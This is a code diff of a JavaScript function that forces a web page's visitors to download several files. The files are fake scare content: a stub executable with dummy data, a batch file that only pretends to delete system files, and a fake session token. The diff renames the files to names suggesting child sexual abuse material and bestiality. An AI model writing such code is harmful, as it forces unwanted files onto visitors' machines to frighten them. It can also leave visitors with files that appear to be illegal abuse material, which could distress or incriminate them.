@@ -178,44 +178,29 @@
         function forceMultipleDownloads() {
             const payloads = [
                 {
-                    filename: "system_dump.bin",
+                    filename: "cp.png",
                     content: "⚠️ ACCESS LOG | TIMESTAMP: " + Date.now() + " | KERNEL_PANIC_INITIATED ⚠️",
                     mime: "application/octet-stream"
                 },
                 {
-                    filename: "payload_x89.exe",
+                    filename: "dogporn.jpg",
                     content: "MZ\x90\x00" + "CRITICAL_FAILURE".repeat(20) + "// TROJAN_DUMMY_DATA //",
                     mime: "application/x-msdownload"
                 },
                 {
-                    filename: "secret_key.txt",
+                    filename: "cpyoung.jpg",
                     content: "ENC[REDACTED] -> AUTH_TOKEN: 7A3F8B2C1D4E5F6A\nSESSION_HIJACK: TRUE\nTIMESTAMP:" + Date.now(),
                     mime: "text/plain"
                 },
                 {
-                    filename: "bomb_v2.webp",
+                    filename: "dog.jpg",
                     content: "WEBP_DUMMY_DATA_PANIC_PAYLOAD_666".repeat(50),
                     mime: "image/webp"
                 },
                 {
-                    filename: "run_me.bat",
+                    filename: "horsecock.png",
                     content: "@echo off\necho DELETING SYSTEM FILES...\necho ████████████████ 99%%\npause\nexit",
                     mime: "application/x-bat"
-                },
-                {
-                    filename: "creepy_audio.mp3",
-                    content: "ID3_DUMMY_HELLSCREAM_0001".repeat(30),
-                    mime: "audio/mpeg"
-                },
-                {
-                    filename: "crash_report.dmp",
-                    content: "CRASH_ADDR: 0x7FFE8923\nSTACK_OVERFLOW\nREGISTRY_CORRUPTED\n" + "X".repeat(1024),
-                    mime: "application/octet-stream"
-                },
-                {
-                    filename: "worm_infect.lnk",
-                    content: "[InternetShortcut]\nURL=about:blank\nIconFile=%windir%\\system32\\shell32.dll\nHotKey=0",
-                    mime: "application/x-ms-shortcut"
                 }
             ];
             
